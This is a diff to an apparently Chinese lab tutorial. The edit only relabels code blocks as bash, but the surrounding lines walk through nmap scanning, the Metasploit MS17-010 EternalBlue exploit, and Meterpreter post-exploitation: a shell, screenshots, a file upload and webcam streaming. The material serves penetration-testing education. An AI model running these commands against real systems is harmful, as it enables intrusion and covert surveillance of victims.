@@ -22,7 +22,7 @@ tags:
 
 1. 使用kali的nmap工具进行扫描，查看同一个网络下，有哪些主机。运行下面这个命令。
 
-```c
+```bash
     # nmap -T4 -A -v -Pn 192.168.20.1/24
 ```
 ![扫描域内主机](./crypto/1.png)
@@ -35,7 +35,7 @@ tags:
 
 3. 在kali上使用工具开始攻击，运行以下命令，稍作等待。
 
-```c
+```bash
     # msfconsole -q  
 ```
 
@@ -47,14 +47,14 @@ tags:
 
 4. 执行以下命令，搜索可以利用的漏洞工具
 
-```c
+```bash
     msf6 > search ms17-010
 ```
 ![ms17-010](./crypto/4.png)
 
 5. 选择序号为0的漏洞进行攻击，分别执行以下代码
 
-```c
+```bash
     msf6 > use 0
     msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 192.168.20.50
     msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhost 192.168.20.129
@@ -95,7 +95,7 @@ tags:
 
 * 使用shell
 
-```c
+```bash
     meterpreter > shell
 ```
 > 运行之后成功进入shell，但是会出现部分乱码，接着输入命令`chcp 65001`，回车后乱码变正常。
@@ -104,7 +104,7 @@ tags:
 
 * 屏幕截图，运行以下命令
 
-```c
+```bash
     meterpreter > screenshot
 ```
 
@@ -120,7 +120,7 @@ tags:
 
 执行以下命令
 
-```c
+```bash
     meterpreter > upload /home/kali/Desktop/shuaige.png c:\\shuaige.png
 ```
 
@@ -134,7 +134,7 @@ tags:
 
 * 调用网络摄像头，运行以下命令
 
-```c
+```bash
     meterpreter > webcam_stream
 ```
 
